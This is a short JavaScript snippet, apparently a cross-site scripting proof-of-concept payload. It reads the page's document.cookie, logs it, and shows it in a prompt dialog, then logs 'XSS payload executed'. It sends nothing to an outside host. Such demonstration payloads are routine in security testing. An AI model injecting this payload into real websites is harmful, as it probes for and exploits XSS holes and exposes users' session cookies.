function xssPayload() {
  const alertMsg = 'xss ' + document.cookie;
  console.log(alertMsg);
  window.prompt(alertMsg);
}

console.log('XSS payload executed');
xssPayload();
